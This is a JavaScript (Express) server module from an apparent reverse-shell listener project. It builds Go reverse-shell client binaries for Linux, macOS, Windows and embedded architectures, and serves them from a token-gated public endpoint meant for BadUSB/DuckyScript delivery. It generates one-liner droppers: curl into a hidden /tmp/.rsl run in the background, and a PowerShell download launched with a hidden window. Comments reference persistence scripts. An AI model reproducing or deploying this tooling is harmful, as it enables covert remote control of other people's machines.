import { execFile } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import { fileURLToPath } from "node:url";
import express from "express";
import config from "../config.js";

const here = path.dirname(fileURLToPath(import.meta.url));

// Directory holding per-OS autoexec scripts for the /cfg endpoint.
// Layout: autoexec/<os>.sh  (or .ps1 for windows). Mounted as a volume in
// production so operators can edit persistence scripts without rebuilding.
const AUTOEXEC_DIR = process.env.AUTOEXEC_DIR
  ? path.resolve(process.env.AUTOEXEC_DIR)
  : path.resolve(here, "..", "autoexec");

const TARGETS = {
  "linux-amd64": { goos: "linux", goarch: "amd64", suffix: "" },
  "linux-arm64": { goos: "linux", goarch: "arm64", suffix: "" },
  "linux-arm-7": { goos: "linux", goarch: "arm", goarm: "7", suffix: "" },
  "linux-mips-softfloat": { goos: "linux", goarch: "mips", gomips: "softfloat", suffix: "" },
  "linux-mipsle-softfloat": { goos: "linux", goarch: "mipsle", gomips: "softfloat", suffix: "" },
  "linux-386": { goos: "linux", goarch: "386", suffix: "" },
  "darwin-arm64": { goos: "darwin", goarch: "arm64", suffix: "" },
  "darwin-amd64": { goos: "darwin", goarch: "amd64", suffix: "" },
  "windows-amd64": { goos: "windows", goarch: "amd64", suffix: ".exe" },
  "windows-arm64": { goos: "windows", goarch: "arm64", suffix: ".exe" },
};

// Sanitize a simple ldflag value: lowercase slug-like strings (tags, etc).
// An empty value is allowed because tags are optional.
function sanitizeLdflagValue(v) {
  const s = String(v || "");
  if (s && !/^[a-z0-9_-]+$/.test(s)) {
    throw new Error(`invalid value for ldflag: ${JSON.stringify(s)}`);
  }
  return s;
}

// Sanitize the mux server URL by parsing it as a URL.
function sanitizeLdflagServerURL(v) {
  const s = String(v || "");
  const u = new URL(s);
  if (!/^wss?:$/.test(u.protocol)) {
    throw new Error(`invalid server URL protocol: ${JSON.stringify(s)}`);
  }
  return s;
}

// Sanitize the base64url BUILD_TOKEN.
function sanitizeLdflagToken(v) {
  const s = String(v || "");
  if (!/^[A-Za-z0-9_-]+$/.test(s)) {
    throw new Error(`invalid value for ldflag: ${JSON.stringify(s)}`);
  }
  return s;
}

function buildClient(target, serverURL, tags) {
  return new Promise((resolve, reject) => {
    const t = TARGETS[target];
    if (!t) return reject(new Error(`unsupported target: ${target}`));

    const clientDir = path.resolve(here, "..", "client");
    if (!fs.existsSync(path.join(clientDir, "go.mod"))) {
      return reject(new Error("client sources not found in image"));
    }

    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "rsl-build-"));
    const outName = "rsl-client" + t.suffix;
    const outPath = path.join(tmp, outName);

    const ldflags = [
      `-s -w`,
      `-X github.com/nemanjan00/reverse-shell-listener/client.defaultServerURL=${sanitizeLdflagServerURL(serverURL)}`,
      `-X github.com/nemanjan00/reverse-shell-listener/client.defaultTags=${sanitizeLdflagValue(tags)}`,
      `-X github.com/nemanjan00/reverse-shell-listener/client.defaultToken=${sanitizeLdflagToken(config.BUILD_TOKEN)}`,
    ].join(" ");

    const env = {
      ...process.env,
      GOOS: t.goos,
      GOARCH: t.goarch,
      CGO_ENABLED: "0",
    };
    if (t.goarm) env.GOARM = t.goarm;
    if (t.gomips) env.GOMIPS = t.gomips;

    const args = ["build", "-trimpath", "-ldflags", ldflags, "-o", outPath, "./cmd"];
    execFile("go", args, { cwd: clientDir, env, maxBuffer: 50 * 1024 * 1024 }, (err) => {
      if (err) {
        fs.rmSync(tmp, { recursive: true, force: true });
        if (err.code === "ENOENT" || /command not found/i.test(err.message)) {
          return reject(
            new Error("Go toolchain not found; install Go or use the Docker image to build clients")
          );
        }
        return reject(err);
      }
      resolve({ outPath, outName, tmp });
    });
  });
}

// Stream a built binary to the response, cleaning up the temp directory even if
// the client disconnects or the response errors before/during the transfer.
async function sendBuiltClient(req, res, target, serverURL, tags) {
  const t = TARGETS[target];
  const outName = t ? `rsl-client${t.suffix}` : "rsl-client";

  let tmp = null;
  let cleaned = false;
  function cleanup() {
    if (cleaned) return;
    cleaned = true;
    if (tmp) {
      try {
        fs.rmSync(tmp, { recursive: true, force: true });
      } catch {
        /* ignore */
      }
    }
  }
  req.on("close", cleanup);

  try {
    const { outPath, tmp: buildTmp } = await buildClient(target, serverURL, tags);
    tmp = buildTmp;
    if (res.destroyed) {
      cleanup();
      return;
    }
    res.setHeader("Content-Type", "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename="${outName}"`);
    const stream = fs.createReadStream(outPath);
    stream.on("error", cleanup);
    stream.on("close", cleanup);
    stream.pipe(res);
  } catch (err) {
    cleanup();
    throw err;
  }
}

// Parse os=...&arch=... query params (or ?target=linux-arm-7 directly) into a
// TARGETS key. Returns null if we can't map it.
function resolveTarget(query) {
  if (query.target && TARGETS[query.target]) return query.target;
  const osName = String(query.os || "").toLowerCase();
  const arch = String(query.arch || "").toLowerCase();
  if (!osName || !arch) return null;
  // Common aliases a badUSB author might type.
  const osMap = { linux: "linux", macos: "darwin", mac: "darwin", darwin: "darwin", windows: "windows", win: "windows" };
  const archMap = {
    x86_64: "amd64", amd64: "amd64", x64: "amd64",
    aarch64: "arm64", arm64: "arm64",
    armv7: "arm-7", arm: "arm-7",
    armv6: null, // unsupported by our target set
    i386: "386", i686: "386", x86: "386",
    mips: "mips-softfloat", mipsle: "mipsle-softfloat", mipsel: "mipsle-softfloat",
  };
  const o = osMap[osName];
  const a = archMap[arch];
  if (!o || !a) return null;
  const key = `${o}-${a}`;
  return TARGETS[key] ? key : null;
}

// Build the mux server URL from the incoming request's own host. The badUSB
// author doesn't need to know it — they just hit the listener's public URL.
function serverURLFromRequest(req) {
  const proto = req.secure || req.headers["x-forwarded-proto"] === "https" ? "wss" : "ws";
  const host = req.headers["x-forwarded-host"] || req.headers.host || "";
  return host ? `${proto}://${host}/mux` : "";
}

// Public, token-gated download endpoint. Mounted BEFORE requireAuth in
// server.js so badUSB scripts don't need a session cookie.
export function dlRouter() {
  const router = express.Router();

  router.get("/", async (req, res) => {
    if (!config.BUILD_TOKEN) {
      return res.status(404).json({ error: "BUILD_TOKEN not set" });
    }
    const token = String(req.query.token || "");
    if (!token || token !== config.BUILD_TOKEN) {
      return res.status(403).json({ error: "invalid token" });
    }

    const target = resolveTarget(req.query);
    if (!target) {
      return res.status(400).json({
        error: "bad target",
        detail: "use ?os=linux&arch=amd64 or ?target=linux-arm-7",
        targets: Object.keys(TARGETS),
      });
    }

    const serverURL = String(req.query.server || "") || serverURLFromRequest(req);
    const tags = String(req.query.tags || "");

    try {
      await sendBuiltClient(req, res, target, serverURL, tags);
    } catch (err) {
      console.error("[dl]   failed:", err.message);
      if (!res.headersSent) {
        res.status(500).json({ error: "build failed", detail: err.message });
      }
    }
  });

  // Short bootstrap script endpoint. Returns a tiny sh/ps1 script that
  // curls the full binary from /dl and runs it. Lets the DuckyScript type
  // a short URL (curl ... | sh) instead of a long one with all the params.
  //   GET /s?token=...&os=linux&arch=amd64&tags=...
  router.get("/s", (req, res) => {
    if (!config.BUILD_TOKEN) {
      return res.status(404).json({ error: "BUILD_TOKEN not set" });
    }
    const token = String(req.query.token || "");
    if (!token || token !== config.BUILD_TOKEN) {
      return res.status(403).json({ error: "invalid token" });
    }
    const osName = String(req.query.os || "").toLowerCase();
    if (!osName) {
      return res.status(400).json({ error: "os query param required" });
    }

    // Build the /dl URL the bootstrap script will fetch. We pass the same
    // query params through (including the token, since the bootstrap script is
    // a one-liner that has no other way to authenticate).
    const params = new URLSearchParams({ token, os: osName });
    if (req.query.arch) params.set("arch", req.query.arch);
    if (req.query.tags) params.set("tags", req.query.tags);
    const proto = req.secure || req.headers["x-forwarded-proto"] === "https" ? "https" : "http";
    const host = req.headers["x-forwarded-host"] || req.headers.host || "";
    const dlUrl = `${proto}://${host}/dl?${params}`;

    const isWindows = osName === "windows" || osName === "win";
    if (isWindows) {
      const script = `$u='${dlUrl}'; $o="$env:TEMP\\rsl.exe"; Invoke-WebRequest -Uri $u -OutFile $o; Start-Process $o -WindowStyle Hidden`;
      res.setHeader("Content-Type", "text/plain");
      res.send(script);
    } else {
      const script = `curl -sL '${dlUrl}' -o /tmp/.rsl && chmod +x /tmp/.rsl && /tmp/.rsl &`;
      res.setHeader("Content-Type", "text/x-shellscript");
      res.send(script);
    }
  });

  return router;
}

export function buildRouter() {
  const router = express.Router();

  router.get("/targets", (req, res) => {
    res.json(Object.keys(TARGETS));
  });

  // Return BUILD_TOKEN so the dashboard's BadUSB modal can build the /s
  // URL without the operator typing it. Behind requireAuth (mounted at
  // /api/build), so only authenticated operators see it.
  router.get("/token", (req, res) => {
    res.json({ token: config.BUILD_TOKEN || "" });
  });

  router.get("/client", async (req, res) => {
    const target = String(req.query.target || "linux-amd64");
    const serverURL = String(req.query.server || "");
    const tags = String(req.query.tags || "");

    try {
      await sendBuiltClient(req, res, target, serverURL, tags);
    } catch (err) {
      console.error("[build] failed:", err.message);
      if (!res.headersSent) {
        res.status(500).json({ error: "build failed", detail: err.message });
      }
    }
  });

  return router;
}